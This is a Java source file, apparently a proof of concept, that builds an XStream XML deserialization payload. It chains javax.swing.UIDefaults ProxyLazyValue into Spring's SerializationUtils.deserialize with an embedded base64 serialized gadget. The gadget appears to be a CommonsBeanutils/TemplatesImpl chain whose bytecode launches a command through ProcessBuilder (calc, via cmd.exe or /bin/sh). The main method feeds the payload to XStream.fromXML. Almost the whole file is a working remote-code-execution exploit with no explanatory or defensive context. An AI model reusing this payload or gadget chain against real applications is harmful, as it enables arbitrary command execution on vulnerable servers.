package com.mechoy;

import com.thoughtworks.xstream.XStream;

public class XStreamTest2 {
    public static void main(String[] args) throws Exception {
        String xml = "<map>\n" +
                "  <entry>\n" +
                "    <javax.swing.UIDefaults serialization=\"custom\">\n" +
                "      <unserializable-parents/>\n" +
                "      <hashtable>\n" +
                "        <default>\n" +
                "          <loadFactor>0.75</loadFactor>\n" +
                "          <threshold>525</threshold>\n" +
                "        </default>\n" +
                "        <int>700</int>\n" +
                "        <int>1</int>\n" +
                "        <string>aaa</string>\n" +
                "        <javax.swing.UIDefaults_-ProxyLazyValue>\n" +
                "          <className>org.springframework.util.SerializationUtils</className>\n" +
                "          <methodName>deserialize</methodName>\n" +
                "          <args>\n" +
                "            <byte-array>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAA8DK/rq+AAAAMgBCAQBRb3JnL2FwYWNoZS9jb21tb21zL2JlYW51dGlscy9jb3lvdGUvdHlwZS9DbGFzc0tleTdiNzlhM2M1NGM5MTRkZjBiYjU1ZGEyNzJiYzU0MzIyBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEABGJhc2UBABJMamF2YS9sYW5nL1N0cmluZzsBAANzZXABAANjbWQBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwALDAAJAAoKAAQADQEAB29zLm5hbWUIAA8BABBqYXZhL2xhbmcvU3lzdGVtBwARAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAEwAUCgASABUBABBqYXZhL2xhbmcvU3RyaW5nBwAXAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAGQAaCgAYABsBAAN3aW4IAB0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAHwAgCgAYACEBAAdjbWQuZXhlCAAjDAAFAAYJAAIAJQEAAi9jCAAnDAAHAAYJAAIAKQEABy9iaW4vc2gIACsBAAItYwgALQwACAAGCQACAC8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADEBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJADMKADIANAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAA2ADcKADIAOAEAEGphdmEvbGFuZy9PYmplY3QHADoBAAg8Y2xpbml0PgEABGNhbGMIAD0KAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAQAAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAEEAAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHADsACAA8AAoAAQBAAAAAGgACAAAAAAAOEj6zADC7AAJZtwA/V7EAAAAAAABwdAAkNmYxYjczOTAtZDg4OC00ZTM0LTkxY2QtYmFjNjk5YzM2NTM2cHcBAHhxAH4ADXg=</byte-array>\n" +
                "          </args>\n" +
                "        </javax.swing.UIDefaults_-ProxyLazyValue>\n" +
                "      </hashtable>\n" +
                "      <javax.swing.UIDefaults>\n" +
                "        <default>\n" +
                "          <defaultLocale>en_US</defaultLocale>\n" +
                "          <resourceCache/>\n" +
                "        </default>\n" +
                "      </javax.swing.UIDefaults>\n" +
                "    </javax.swing.UIDefaults>\n" +
                "    <javax.swing.UIDefaults reference=\"../javax.swing.UIDefaults\"/>\n" +
                "  </entry>\n" +
                "  <entry>\n" +
                "    <javax.swing.UIDefaults serialization=\"custom\">\n" +
                "      <unserializable-parents/>\n" +
                "      <hashtable>\n" +
                "        <default>\n" +
                "          <loadFactor>0.75</loadFactor>\n" +
                "          <threshold>525</threshold>\n" +
                "        </default>\n" +
                "        <int>700</int>\n" +
                "        <int>1</int>\n" +
                "        <string>aaa</string>\n" +
                "        <javax.swing.UIDefaults_-ProxyLazyValue reference=\"../../../../entry/javax.swing.UIDefaults/hashtable/javax.swing.UIDefaults_-ProxyLazyValue\"/>\n" +
                "      </hashtable>\n" +
                "      <javax.swing.UIDefaults>\n" +
                "        <default>\n" +
                "          <defaultLocale reference=\"../../../../../entry/javax.swing.UIDefaults/javax.swing.UIDefaults/default/defaultLocale\"/>\n" +
                "          <resourceCache/>\n" +
                "        </default>\n" +
                "      </javax.swing.UIDefaults>\n" +
                "    </javax.swing.UIDefaults>\n" +
                "    <javax.swing.UIDefaults reference=\"../javax.swing.UIDefaults\"/>\n" +
                "  </entry>\n" +
                "</map>";
        Object o = new XStream().fromXML(xml);
    }
}
